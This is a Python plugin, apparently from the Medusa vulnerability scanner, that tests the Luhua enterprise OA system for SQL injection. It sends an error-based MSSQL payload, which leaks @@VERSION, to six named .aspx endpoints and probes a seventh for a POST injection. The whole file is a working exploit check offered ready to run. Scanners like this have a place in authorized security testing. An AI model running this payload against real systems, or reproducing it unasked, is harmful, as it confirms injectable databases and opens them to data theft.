#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 璐华企业版OA系统多处SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-065191
author: Lucifer
description: ruvaroa多处SQL注入。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


payload = "ChAr(71)%2BChAr(81)%2BChAr(88)%2B@@VeRsIoN"
urls = ["/flow/flow_get_if_value.aspx?template_id=",
        "/include/get_dict.aspx?bt_id=",
        "/LHMail/email_attach_delete.aspx?attach_id=",
        "/OnlineChat/chat_show.aspx?id=",
        "/OnlineChat/chatroom_show.aspx?id=",
        "/OnlineReport/get_condiction.aspx?t_id="]
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    Medusas=[]
    try:
        for turl in urls:
            payload_url = scheme+"://"+url+turl+payload
            headers = {
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'User-Agent': RandomAgent,
            }
            #s = requests.session()
            if ProxyIp!=None:
                proxies = {
                    # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                    "http": "http://" + str(ProxyIp)
                }
                resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
            elif ProxyIp==None:
                resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
            con = resp.text
            code = resp.status_code
            if code==500 and con.lower().find('gqxmicrosoft')!=-1:
                Medusa = "{} 存在璐华企业版OA系统多处SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
                Medusas.append(str(Medusa))
    except Exception as e:
        pass
    try:

        payload_url = scheme+"://"+url+"/include/get_user.aspx"
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': RandomAgent,
        }
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if  con.lower().find('button_normal')!=-1:
            Medusa = "{} 存在璐华企业版OA系统POST SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            Medusas.append(str(Medusa))
    except Exception as e:
        pass
    return Medusas